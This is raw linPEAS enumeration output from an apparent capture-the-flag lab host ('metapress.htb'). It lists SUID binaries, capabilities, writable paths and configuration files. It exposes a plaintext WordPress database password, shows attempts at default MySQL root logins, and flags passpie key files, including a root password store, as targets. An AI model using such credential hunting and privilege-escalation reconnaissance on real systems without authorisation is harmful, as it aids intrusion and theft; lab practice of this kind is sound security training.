-rw-r--r-- 1 root root 1447 May 29  2021 /etc/nginx/nginx.conf
user www-data;
worker_processes auto;
pid /run/nginx.pid;
include /etc/nginx/modules-enabled/*.conf;
events {
        worker_connections 768;
}
http {
        sendfile on;
        tcp_nopush on;
        types_hash_max_size 2048;
        include /etc/nginx/mime.types;
        default_type application/octet-stream;
        ssl_prefer_server_ciphers on;
        access_log /var/log/nginx/access.log;
        error_log /var/log/nginx/error.log;
        gzip on;
        include /etc/nginx/conf.d/*.conf;
        include /etc/nginx/sites-enabled/*;
}

-rw-r--r-- 1 root root 374 May 29  2021 /etc/ufw/applications.d/nginx

drwxr-xr-x 3 root root 4096 Oct  4  2022 /usr/lib/nginx

-rwxr-xr-x 1 root root 1190896 May 14  2022 /usr/sbin/nginx

drwxr-xr-x 2 root root 4096 Oct  4  2022 /usr/share/doc/nginx

drwxr-xr-x 4 root root 4096 Oct  4  2022 /usr/share/nginx
-rw-r--r-- 1 root root 40 May 14  2022 /usr/share/nginx/modules-available/mod-mail.conf
load_module modules/ngx_mail_module.so;
-rw-r--r-- 1 root root 42 May 14  2022 /usr/share/nginx/modules-available/mod-stream.conf
load_module modules/ngx_stream_module.so;
-rw-r--r-- 1 root root 46 May 14  2022 /usr/share/nginx/modules-available/mod-http-geoip.conf
load_module modules/ngx_http_geoip_module.so;
-rw-r--r-- 1 root root 53 May 14  2022 /usr/share/nginx/modules-available/mod-http-image-filter.conf
load_module modules/ngx_http_image_filter_module.so;
-rw-r--r-- 1 root root 52 May 14  2022 /usr/share/nginx/modules-available/mod-http-xslt-filter.conf
load_module modules/ngx_http_xslt_filter_module.so;
-rw-r--r-- 1 root root 48 May 14  2022 /usr/share/nginx/modules-available/mod-stream-geoip.conf
load_module modules/ngx_stream_geoip_module.so;

drwxr-xr-x 7 root root 4096 Oct  5  2022 /var/lib/nginx
find: ‘/var/lib/nginx/scgi’: Permission denied
find: ‘/var/lib/nginx/body’: Permission denied
find: ‘/var/lib/nginx/fastcgi’: Permission denied
find: ‘/var/lib/nginx/uwsgi’: Permission denied
find: ‘/var/lib/nginx/proxy’: Permission denied

drwxr-xr-x 2 root adm 4096 Mar  4 00:00 /var/log/nginx

╔══════════╣ Analyzing MariaDB Files (limit 70)
-rw-r--r-- 1 root root 1126 Feb 18  2022 /etc/mysql/mariadb.cnf                                                                                       
[client-server]
socket = /run/mysqld/mysqld.sock
!includedir /etc/mysql/conf.d/
!includedir /etc/mysql/mariadb.conf.d/

-rw------- 1 root root 544 Jun 26  2022 /etc/mysql/debian.cnf

╔══════════╣ Analyzing Wordpress Files (limit 70)
-rw-r--r-- 1 www-data www-data 2032 Jun 23  2022 /var/www/metapress.htb/blog/wp-config.php                                                            
define( 'DB_NAME', 'blog' );
define( 'DB_USER', 'blog' );
define( 'DB_PASSWORD', '635Aq@TdqrCwXFUZ' );
define( 'DB_HOST', 'localhost' );
define( 'FTP_USER', 'metapress.htb' );
define( 'FTP_HOST', 'ftp.metapress.htb' );

╔══════════╣ Analyzing Rsync Files (limit 70)
-rw-r--r-- 1 root root 1044 Sep 18  2021 /usr/share/doc/rsync/examples/rsyncd.conf                                                                    
[ftp]
        comment = public archive
        path = /var/www/pub
        use chroot = yes
        lock file = /var/lock/rsyncd
        read only = yes
        list = yes
        uid = nobody
        gid = nogroup
        strict modes = yes
        ignore errors = no
        ignore nonreadable = yes
        transfer logging = no
        timeout = 600
        refuse options = checksum dry-run
        dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz

╔══════════╣ Analyzing PAM Auth Files (limit 70)
drwxr-xr-x 2 root root 4096 Oct  5  2022 /etc/pam.d                                                                                                   
-rw-r--r-- 1 root root 2133 Mar 13  2021 /etc/pam.d/sshd
account    required     pam_nologin.so
session [success=ok ignore=ignore module_unknown=ignore default=bad]        pam_selinux.so close
session    required     pam_loginuid.so
session    optional     pam_keyinit.so force revoke
session    optional     pam_motd.so  motd=/run/motd.dynamic
session    optional     pam_motd.so noupdate
session    optional     pam_mail.so standard noenv # [1]
session    required     pam_limits.so
session    required     pam_env.so # [1]
session    required     pam_env.so user_readenv=1 envfile=/etc/default/locale
session [success=ok ignore=ignore module_unknown=ignore default=bad]        pam_selinux.so open

╔══════════╣ Analyzing Ldap Files (limit 70)
The password hash is from the {SSHA} to 'structural'                                                                                                  
drwxr-xr-x 2 root root 4096 Oct  5  2022 /etc/ldap

╔══════════╣ Analyzing Keyring Files (limit 70)
drwxr-xr-x 2 root root 4096 Jun 26  2022 /usr/share/keyrings                                                                                          

╔══════════╣ Analyzing FastCGI Files (limit 70)
-rw-r--r-- 1 root root 1055 May 29  2021 /etc/nginx/fastcgi_params                                                                                    

╔══════════╣ Analyzing FTP Files (limit 70)

-rw-r--r-- 1 root root 69 Jun 25  2022 /etc/php/8.0/mods-available/ftp.ini
-rw-r--r-- 1 root root 69 Sep 29  2022 /usr/share/php8.0-common/common/ftp.ini

╔══════════╣ Analyzing Interesting logs Files (limit 70)
-rw-r----- 1 www-data adm 11187 Mar  4 01:17 /var/log/nginx/access.log                                                                                

-rw-r----- 1 www-data adm 8210 Mar  4 00:49 /var/log/nginx/error.log

╔══════════╣ Analyzing Other Interesting Files (limit 70)
-rw-r--r-- 1 root root 3526 Aug  4  2021 /etc/skel/.bashrc                                                                                            
-rw-r--r-- 1 jnelson jnelson 3526 Jun 26  2022 /home/jnelson/.bashrc

-rw-r--r-- 1 root root 807 Aug  4  2021 /etc/skel/.profile
-rw-r--r-- 1 jnelson jnelson 807 Jun 26  2022 /home/jnelson/.profile

╔══════════╣ Analyzing Windows Files (limit 70)

lrwxrwxrwx 1 root root 22 Jun 26  2022 /etc/alternatives/my.cnf -> /etc/mysql/mariadb.cnf
lrwxrwxrwx 1 root root 24 Jun 26  2022 /etc/mysql/my.cnf -> /etc/alternatives/my.cnf
-rw-r--r-- 1 root root 83 Jun 26  2022 /var/lib/dpkg/alternatives/my.cnf

╔══════════╣ Searching mysql credentials and exec
From '/etc/mysql/mariadb.conf.d/50-server.cnf' Mysql user: user                    = mysql                                                            
Found readable /etc/mysql/my.cnf
[client-server]
socket = /run/mysqld/mysqld.sock
!includedir /etc/mysql/conf.d/
!includedir /etc/mysql/mariadb.conf.d/

╔══════════╣ MySQL version
mysql  Ver 15.1 Distrib 10.5.15-MariaDB, for debian-linux-gnu (x86_64) using  EditLine wrapper                                                        

═╣ MySQL connection using default root/root ........... No
═╣ MySQL connection using root/toor ................... No                                                                                            
═╣ MySQL connection using root/NOPASS ................. No                                                                                            

╔══════════╣ Analyzing PGP-GPG Files (limit 70)
/usr/bin/gpg                                                                                                                                          
netpgpkeys Not Found
netpgp Not Found                                                                                                                                      

-rw-r--r-- 1 root root 8700 Feb 25  2021 /etc/apt/trusted.gpg.d/debian-archive-bullseye-automatic.gpg
-rw-r--r-- 1 root root 8709 Feb 25  2021 /etc/apt/trusted.gpg.d/debian-archive-bullseye-security-automatic.gpg
-rw-r--r-- 1 root root 2453 Feb 25  2021 /etc/apt/trusted.gpg.d/debian-archive-bullseye-stable.gpg
-rw-r--r-- 1 root root 8132 Feb 25  2021 /etc/apt/trusted.gpg.d/debian-archive-buster-automatic.gpg
-rw-r--r-- 1 root root 8141 Feb 25  2021 /etc/apt/trusted.gpg.d/debian-archive-buster-security-automatic.gpg
-rw-r--r-- 1 root root 2332 Feb 25  2021 /etc/apt/trusted.gpg.d/debian-archive-buster-stable.gpg
-rw-r--r-- 1 root root 7443 Feb 25  2021 /etc/apt/trusted.gpg.d/debian-archive-stretch-automatic.gpg
-rw-r--r-- 1 root root 7452 Feb 25  2021 /etc/apt/trusted.gpg.d/debian-archive-stretch-security-automatic.gpg
-rw-r--r-- 1 root root 2263 Feb 25  2021 /etc/apt/trusted.gpg.d/debian-archive-stretch-stable.gpg
-rw-r--r-- 1 root root 1769 Feb 16  2021 /etc/apt/trusted.gpg.d/php.gpg
-rw-r--r-- 1 root root 2899 Jul  1  2022 /usr/share/gnupg/distsigkey.gpg
-rw-r--r-- 1 root root 8700 Feb 25  2021 /usr/share/keyrings/debian-archive-bullseye-automatic.gpg
-rw-r--r-- 1 root root 8709 Feb 25  2021 /usr/share/keyrings/debian-archive-bullseye-security-automatic.gpg
-rw-r--r-- 1 root root 2453 Feb 25  2021 /usr/share/keyrings/debian-archive-bullseye-stable.gpg
-rw-r--r-- 1 root root 8132 Feb 25  2021 /usr/share/keyrings/debian-archive-buster-automatic.gpg
-rw-r--r-- 1 root root 8141 Feb 25  2021 /usr/share/keyrings/debian-archive-buster-security-automatic.gpg
-rw-r--r-- 1 root root 2332 Feb 25  2021 /usr/share/keyrings/debian-archive-buster-stable.gpg
-rw-r--r-- 1 root root 55625 Feb 25  2021 /usr/share/keyrings/debian-archive-keyring.gpg
-rw-r--r-- 1 root root 36873 Feb 25  2021 /usr/share/keyrings/debian-archive-removed-keys.gpg
-rw-r--r-- 1 root root 7443 Feb 25  2021 /usr/share/keyrings/debian-archive-stretch-automatic.gpg
-rw-r--r-- 1 root root 7452 Feb 25  2021 /usr/share/keyrings/debian-archive-stretch-security-automatic.gpg
-rw-r--r-- 1 root root 2263 Feb 25  2021 /usr/share/keyrings/debian-archive-stretch-stable.gpg

╔══════════╣ Searching uncommon passwd files (splunk)
passwd file: /etc/pam.d/passwd                                                                                                                        
passwd file: /etc/passwd
passwd file: /usr/share/lintian/overrides/passwd

╔══════════╣ Searching ssl/ssh files
╔══════════╣ Analyzing SSH Files (limit 70)                                                                                                           

-rw-r--r-- 1 root root 172 Jun 26  2022 /etc/ssh/ssh_host_ecdsa_key.pub
-rw-r--r-- 1 root root 92 Jun 26  2022 /etc/ssh/ssh_host_ed25519_key.pub
-rw-r--r-- 1 root root 564 Jun 26  2022 /etc/ssh/ssh_host_rsa_key.pub

ChallengeResponseAuthentication no
UsePAM yes
PermitRootLogin no
PasswordAuthentication yes
PermitEmptyPasswords no
ChallengeResponseAuthentication no

══╣ Possible private SSH keys were found!
/home/jnelson/.passpie/.keys

══╣ Some certificates were found (out limited):
/etc/ssl/certs/ACCVRAIZ1.pem                                                                                                                          
/etc/ssl/certs/AC_RAIZ_FNMT-RCM.pem
/etc/ssl/certs/Actalis_Authentication_Root_CA.pem
/etc/ssl/certs/AffirmTrust_Commercial.pem
/etc/ssl/certs/AffirmTrust_Networking.pem
/etc/ssl/certs/AffirmTrust_Premium_ECC.pem
/etc/ssl/certs/AffirmTrust_Premium.pem
/etc/ssl/certs/Amazon_Root_CA_1.pem
/etc/ssl/certs/Amazon_Root_CA_2.pem
/etc/ssl/certs/Amazon_Root_CA_3.pem
/etc/ssl/certs/Amazon_Root_CA_4.pem
/etc/ssl/certs/Atos_TrustedRoot_2011.pem
/etc/ssl/certs/Autoridad_de_Certificacion_Firmaprofesional_CIF_A62634068.pem
/etc/ssl/certs/Baltimore_CyberTrust_Root.pem
/etc/ssl/certs/Buypass_Class_2_Root_CA.pem
/etc/ssl/certs/Buypass_Class_3_Root_CA.pem
/etc/ssl/certs/ca-certificates.crt
/etc/ssl/certs/CA_Disig_Root_R2.pem
/etc/ssl/certs/Certigna.pem
/etc/ssl/certs/Certigna_Root_CA.pem
17660PSTORAGE_CERTSBIN

══╣ Writable ssh and gpg agents
/etc/systemd/user/sockets.target.wants/gpg-agent-ssh.socket                                                                                           
/etc/systemd/user/sockets.target.wants/gpg-agent-browser.socket
/etc/systemd/user/sockets.target.wants/gpg-agent.socket
/etc/systemd/user/sockets.target.wants/gpg-agent-extra.socket
══╣ Some home ssh config file was found
/usr/share/openssh/sshd_config                                                                                                                        
Include /etc/ssh/sshd_config.d/*.conf
ChallengeResponseAuthentication no
UsePAM yes
X11Forwarding yes
PrintMotd no
AcceptEnv LANG LC_*
Subsystem       sftp    /usr/lib/openssh/sftp-server

══╣ /etc/hosts.allow file found, trying to read the rules:
/etc/hosts.allow                                                                                                                                      

Searching inside /etc/ssh/ssh_config for interesting info
Include /etc/ssh/ssh_config.d/*.conf
Host *
    SendEnv LANG LC_*
    HashKnownHosts yes
    GSSAPIAuthentication yes

                      ╔════════════════════════════════════╗
══════════════════════╣ Files with Interesting Permissions ╠══════════════════════                                                                    
                      ╚════════════════════════════════════╝                                                                                          
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                                                       
strings Not Found                                                                                                                                     
strace Not Found                                                                                                                                      
-rwsr-xr-x 1 root root 55K Jan 20  2022 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8                           
-rwsr-xr-x 1 root root 58K Feb  7  2020 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 44K Feb  7  2020 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 52K Feb  7  2020 /usr/bin/chsh
-rwsr-xr-x 1 root root 179K Feb 27  2021 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 35K Jan 20  2022 /usr/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 35K Feb 26  2021 /usr/bin/fusermount
-rwsr-xr-x 1 root root 87K Feb  7  2020 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 71K Jan 20  2022 /usr/bin/su
-rwsr-xr-x 1 root root 63K Feb  7  2020 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 471K Jul  1  2022 /usr/lib/openssh/ssh-keysign
-rwsr-xr-- 1 root messagebus 51K Oct  5  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper

╔══════════╣ SGID
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                                                       
-rwxr-sr-x 1 root shadow 38K Aug 26  2021 /usr/sbin/unix_chkpwd                                                                                       
-rwxr-sr-x 1 root tty 35K Jan 20  2022 /usr/bin/wall
-rwxr-sr-x 1 root shadow 31K Feb  7  2020 /usr/bin/expiry
-rwxr-sr-x 1 root crontab 43K Feb 22  2021 /usr/bin/crontab
-rwxr-sr-x 1 root ssh 347K Jul  1  2022 /usr/bin/ssh-agent
-rwxr-sr-x 1 root shadow 79K Feb  7  2020 /usr/bin/chage

╔══════════╣ Files with ACLs (limited to 50)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#acls                                                                
files with acls in searched folders Not Found                                                                                                         

╔══════════╣ Capabilities
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#capabilities                                                        
══╣ Current shell capabilities                                                                                                                        
CapInh:  0x0000000000000000=                                                                                                                          
CapPrm:  0x0000000000000000=
CapEff:  0x0000000000000000=
CapBnd:  0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
CapAmb:  0x0000000000000000=

╚ Parent process capabilities
CapInh:  0x0000000000000000=                                                                                                                          
CapPrm:  0x0000000000000000=
CapEff:  0x0000000000000000=
CapBnd:  0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
CapAmb:  0x0000000000000000=

Files with capabilities (limited to 50):
/usr/bin/ping cap_net_raw=ep

╔══════════╣ Checking misconfigurations of ld.so
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#ldso                                                                
/etc/ld.so.conf                                                                                                                                       
Content of /etc/ld.so.conf:                                                                                                                           
include /etc/ld.so.conf.d/*.conf

/etc/ld.so.conf.d
  /etc/ld.so.conf.d/libc.conf                                                                                                                         
  - /usr/local/lib                                                                                                                                    
  /etc/ld.so.conf.d/x86_64-linux-gnu.conf
  - /usr/local/lib/x86_64-linux-gnu                                                                                                                   
  - /lib/x86_64-linux-gnu
  - /usr/lib/x86_64-linux-gnu

/etc/ld.so.preload
╔══════════╣ Files (scripts) in /etc/profile.d/                                                                                                       
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#profiles-files                                                      
total 16                                                                                                                                              
drwxr-xr-x  2 root root 4096 Jun 26  2022 .
drwxr-xr-x 76 root root 4096 Mar  4 01:26 ..
-rw-r--r--  1 root root 1107 Feb 10  2021 gawk.csh
-rw-r--r--  1 root root  757 Feb 10  2021 gawk.sh

╔══════════╣ Permissions in init, init.d, systemd, and rc.d
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#init-initd-systemd-and-rcd                                          

╔══════════╣ AppArmor binary profiles
-rw-r--r-- 1 root root  730 Feb 20  2022 usr.sbin.mariadbd                                                                                            

═╣ Hashes inside passwd file? ........... No
═╣ Writable passwd file? ................ No                                                                                                          
═╣ Credentials in fstab/mtab? ........... No                                                                                                          
═╣ Can I read shadow files? ............. No                                                                                                          
═╣ Can I read shadow plists? ............ No                                                                                                          
═╣ Can I write shadow plists? ........... No                                                                                                          
═╣ Can I read opasswd file? ............. No                                                                                                          
═╣ Can I write in network-scripts? ...... No                                                                                                          
═╣ Can I read root folder? .............. No                                                                                                          

╔══════════╣ Searching root files in home dirs (limit 30)
/home/                                                                                                                                                
/home/jnelson/user.txt
/home/jnelson/.bash_history
/root/
/var/www
/var/www/metapress.htb

╔══════════╣ Searching folders owned by me containing others files on it (limit 100)
-rw-r----- 1 root jnelson 33 Mar  3 11:37 /home/jnelson/user.txt                                                                                      

╔══════════╣ Readable files belonging to root and readable by me but not world readable
-rw-r----- 1 root jnelson 33 Mar  3 11:37 /home/jnelson/user.txt                                                                                      

╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 200)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files                                                      
/dev/mqueue                                                                                                                                           
/dev/shm
/home/jnelson
/run/lock
/run/user/1000
/run/user/1000/gnupg
/run/user/1000/systemd
/run/user/1000/systemd/inaccessible
/run/user/1000/systemd/inaccessible/dir
/run/user/1000/systemd/inaccessible/reg
/tmp
/tmp/.font-unix
/tmp/.ICE-unix
/tmp/.Test-unix
/tmp/.X11-unix
/tmp/.XIM-unix
/var/lib/php/sessions
/var/tmp

╔══════════╣ Interesting GROUP writable files (not in Home) (max 200)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files                                                      

                            ╔═════════════════════════╗
════════════════════════════╣ Other Interesting Files ╠════════════════════════════                                                                   
                            ╚═════════════════════════╝                                                                                               
╔══════════╣ .sh files in path
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#scriptbinaries-in-path                                              
/usr/bin/gettext.sh                                                                                                                                   

╔══════════╣ Executable files potentially added by user (limit 70)
2022-10-25+12:52:06.5009076700 /home/jnelson/.passpie/ssh/jnelson.pass                                                                                
2022-10-25+12:52:06.4969076700 /home/jnelson/.passpie/ssh/root.pass
2022-10-03+13:52:29.8046513600 /etc/console-setup/cached_setup_terminal.sh
2022-10-03+13:52:29.8046513600 /etc/console-setup/cached_setup_keyboard.sh
2022-10-03+13:52:29.8046513600 /etc/console-setup/cached_setup_font.sh
2022-06-26+15:59:08.0960021340 /usr/local/bin/wp
2022-06-26+15:59:00.3040021030 /usr/local/bin/passpie
2022-06-26+15:59:00.1280021030 /usr/local/bin/tabulate
2022-06-26+15:58:56.1720020870 /usr/local/bin/wheel
2022-06-26+15:58:56.1120020870 /usr/local/bin/easy_install-2.7
2022-06-26+15:58:56.1120020870 /usr/local/bin/easy_install
2022-06-26+15:58:55.8680020860 /usr/local/bin/pip2.7
2022-06-26+15:58:55.8680020860 /usr/local/bin/pip2
2022-06-26+15:58:55.8680020860 /usr/local/bin/pip

╔══════════╣ Unexpected in root
/initrd.img.old                                                                                                                                       
/initrd.img
/vmlinuz
/vmlinuz.old
/.bash_history

╔══════════╣ Modified interesting files in the last 5mins (limit 100)
/var/log/auth.log                                                                                                                                     
/var/log/daemon.log
/var/log/syslog
/var/log/journal/f70af50882144373ae213f10b93514fa/user-1000.journal
/var/log/journal/f70af50882144373ae213f10b93514fa/system.journal
/home/jnelson/.gnupg/pubring.kbx
/home/jnelson/.gnupg/trustdb.gpg

╔══════════╣ Writable log files (logrotten) (limit 50)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#logrotate-exploitation                                              
logrotate 3.18.0                                                                                                                                      

    Default mail command:       /usr/bin/mail
    Default compress command:   /bin/gzip
    Default uncompress command: /bin/gunzip
    Default compress extension: .gz
    Default state file path:    /var/lib/logrotate/status
    ACL support:                yes
    SELinux support:            yes

╔══════════╣ Files inside /home/jnelson (limit 20)
total 36                                                                                                                                              
drwxr-xr-x 5 jnelson jnelson 4096 Mar  4 01:32 .
drwxr-xr-x 3 root    root    4096 Oct  5  2022 ..
lrwxrwxrwx 1 root    root       9 Jun 26  2022 .bash_history -> /dev/null
-rw-r--r-- 1 jnelson jnelson  220 Jun 26  2022 .bash_logout
-rw-r--r-- 1 jnelson jnelson 3526 Jun 26  2022 .bashrc
drwx------ 3 jnelson jnelson 4096 Mar  4 01:32 .gnupg
drwxr-xr-x 3 jnelson jnelson 4096 Oct 25  2022 .local
dr-xr-x--- 3 jnelson jnelson 4096 Oct 25  2022 .passpie
-rw-r--r-- 1 jnelson jnelson  807 Jun 26  2022 .profile
-rw-r----- 1 root    jnelson   33 Mar  3 11:37 user.txt

╔══════════╣ Files inside others home (limit 20)
/var/www/metapress.htb/mailer/send_email.php                                                                                                          
/var/www/metapress.htb/mailer/PHPMailer/COMMITMENT
/var/www/metapress.htb/mailer/PHPMailer/src/SMTP.php
/var/www/metapress.htb/mailer/PHPMailer/src/POP3.php
/var/www/metapress.htb/mailer/PHPMailer/src/OAuthTokenProvider.php
/var/www/metapress.htb/mailer/PHPMailer/src/OAuth.php
/var/www/metapress.htb/mailer/PHPMailer/src/Exception.php
/var/www/metapress.htb/mailer/PHPMailer/src/PHPMailer.php
/var/www/metapress.htb/mailer/PHPMailer/get_oauth_token.php
/var/www/metapress.htb/mailer/PHPMailer/LICENSE
/var/www/metapress.htb/mailer/PHPMailer/SECURITY.md
/var/www/metapress.htb/mailer/PHPMailer/language/phpmailer.lang-ja.php
/var/www/metapress.htb/mailer/PHPMailer/language/phpmailer.lang-it.php
/var/www/metapress.htb/mailer/PHPMailer/language/phpmailer.lang-hy.php
/var/www/metapress.htb/mailer/PHPMailer/language/phpmailer.lang-nl.php
/var/www/metapress.htb/mailer/PHPMailer/language/phpmailer.lang-az.php
/var/www/metapress.htb/mailer/PHPMailer/language/phpmailer.lang-hu.php
/var/www/metapress.htb/mailer/PHPMailer/language/phpmailer.lang-be.php
/var/www/metapress.htb/mailer/PHPMailer/language/phpmailer.lang-mn.php
/var/www/metapress.htb/mailer/PHPMailer/language/phpmailer.lang-ro.php
grep: write error: Broken pipe

╔══════════╣ Searching installed mail applications

╔══════════╣ Mails (limit 50)

╔══════════╣ Backup folders
drwxr-xr-x 2 root root 4096 Mar  3 12:26 /var/backups                                                                                                 
total 448
-rw-r--r-- 1 root root  30720 Oct 25  2022 alternatives.tar.0
-rw-r--r-- 1 root root  12815 Oct 25  2022 apt.extended_states.0
-rw-r--r-- 1 root root   1398 Oct  5  2022 apt.extended_states.1.gz
-rw-r--r-- 1 root root   1335 Oct  3  2022 apt.extended_states.2.gz
-rw-r--r-- 1 root root      0 Oct 25  2022 dpkg.arch.0
-rw-r--r-- 1 root root    186 Jun 26  2022 dpkg.diversions.0
-rw-r--r-- 1 root root    172 Jun 26  2022 dpkg.statoverride.0
-rw-r--r-- 1 root root 392586 Oct 25  2022 dpkg.status.0

╔══════════╣ Backup files (limited 100)
-rw-r--r-- 1 root root 351 Feb 20  2022 /usr/share/man/man1/wsrep_sst_mariabackup.1.gz                                                                
-rwxr-xr-x 1 root root 43891 Feb 20  2022 /usr/bin/wsrep_sst_mariabackup
-rw-r--r-- 1 root root 10147 Oct 21  2022 /usr/lib/modules/5.10.0-19-amd64/kernel/drivers/net/team/team_mode_activebackup.ko
-rw-r--r-- 1 root root 43896 Aug 24  2022 /usr/lib/open-vm-tools/plugins/vmsvc/libvmbackup.so

╔══════════╣ Web files?(output limit)
/var/www/:                                                                                                                                            
total 12K
drwxr-xr-x  3 root root     4.0K Oct  5  2022 .
drwxr-xr-x 12 root root     4.0K Oct  5  2022 ..
drwxr-xr-x  4 root www-data 4.0K Oct  5  2022 metapress.htb

/var/www/metapress.htb:
total 16K
drwxr-xr-x 4 root     www-data 4.0K Oct  5  2022 .
drwxr-xr-x 3 root     root     4.0K Oct  5  2022 ..

╔══════════╣ All relevant hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
-rw-r--r-- 1 www-data www-data 633 Jun 23  2022 /var/www/metapress.htb/blog/.htaccess                                                                 
-rw-r--r-- 1 www-data www-data 620 Nov 12  2020 /var/www/metapress.htb/blog/wp-content/themes/twentytwentyone/.stylelintrc-css.json
-rw-r--r-- 1 www-data www-data 89 Nov 12  2020 /var/www/metapress.htb/blog/wp-content/themes/twentytwentyone/.stylelintignore
-rw-r--r-- 1 www-data www-data 356 Nov 12  2020 /var/www/metapress.htb/blog/wp-content/themes/twentytwentyone/.stylelintrc.json
-rw-r--r-- 1 root root 0 Mar  3 11:37 /run/network/.ifstate.lock
-rw------- 1 root root 0 Jun 26  2022 /etc/.pwd.lock
-rw-r--r-- 1 root root 220 Aug  4  2021 /etc/skel/.bash_logout
-rw-r--r-- 1 jnelson jnelson 220 Jun 26  2022 /home/jnelson/.bash_logout
-r-xr-x--- 1 jnelson jnelson 3 Jun 26  2022 /home/jnelson/.passpie/.config
-rw-r--r-- 1 root root 0 Feb 22  2021 /usr/share/dictionaries-common/site-elisp/.nosearch

╔══════════╣ Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)
-rw-r--r-- 1 root root 0 Oct 25  2022 /var/backups/dpkg.arch.0                                                                                        
-rw-r--r-- 1 root root 30720 Oct 25  2022 /var/backups/alternatives.tar.0

╔══════════╣ Searching passwords in history files
/usr/local/lib/python2.7/dist-packages/tests/test_history.py:@pytest.fixture                                                                          
/usr/local/lib/python2.7/dist-packages/tests/test_history.py:    @ensure_git()
/usr/local/lib/python2.7/dist-packages/tests/test_history.py:    url = 'https://foo@example.com/user/repo.git'
/usr/local/lib/python2.7/dist-packages/tests/test_history.py:    url = 'https://foo@example.com/user/repo.git'
/usr/local/lib/python2.7/dist-packages/tests/test_history.py:    url = 'https://foo@example.com/user/repo.git'

╔══════════╣ Searching passwords in config PHP files
/var/www/metapress.htb/blog/wp-admin/setup-config.php:          $pwd    = trim( wp_unslash( $_POST['pwd'] ) );                                        

╔══════════╣ Searching *password* or *credential* files in home (limit 70)
/etc/pam.d/common-password                                                                                                                            
/usr/bin/systemd-ask-password
/usr/bin/systemd-tty-ask-password-agent
/usr/lib/grub/i386-pc/legacy_password_test.mod
/usr/lib/grub/i386-pc/password.mod
/usr/lib/grub/i386-pc/password_pbkdf2.mod
/usr/lib/mysql/plugin/simple_password_check.so
/usr/lib/systemd/systemd-reply-password
/usr/lib/systemd/system/multi-user.target.wants/systemd-ask-password-wall.path
/usr/lib/systemd/system/sysinit.target.wants/systemd-ask-password-console.path
/usr/lib/systemd/system/systemd-ask-password-console.path
/usr/lib/systemd/system/systemd-ask-password-console.service
/usr/lib/systemd/system/systemd-ask-password-wall.path
/usr/lib/systemd/system/systemd-ask-password-wall.service
  #)There are more creds/passwds files in the previous parent folder

/usr/lib/x86_64-linux-gnu/libmariadb3/plugin/mysql_clear_password.so
/usr/lib/x86_64-linux-gnu/libmariadb3/plugin/sha256_password.so
/usr/local/lib/python2.7/dist-packages/passpie/credential.py
/usr/local/lib/python2.7/dist-packages/passpie/credential.pyc
/usr/local/lib/python2.7/dist-packages/tests/test_credential.py
/usr/local/lib/python2.7/dist-packages/tests/test_credential.pyc
/usr/share/man/man1/systemd-ask-password.1.gz
/usr/share/man/man1/systemd-tty-ask-password-agent.1.gz
/usr/share/man/man8/systemd-ask-password-console.path.8.gz
/usr/share/man/man8/systemd-ask-password-console.service.8.gz
/usr/share/man/man8/systemd-ask-password-wall.path.8.gz
/usr/share/man/man8/systemd-ask-password-wall.service.8.gz
  #)There are more creds/passwds files in the previous parent folder

/usr/share/pam/common-password.md5sums
/var/cache/debconf/passwords.dat
/var/lib/pam/password
/var/www/metapress.htb/blog/wp-admin/includes/class-wp-application-passwords-list-table.php
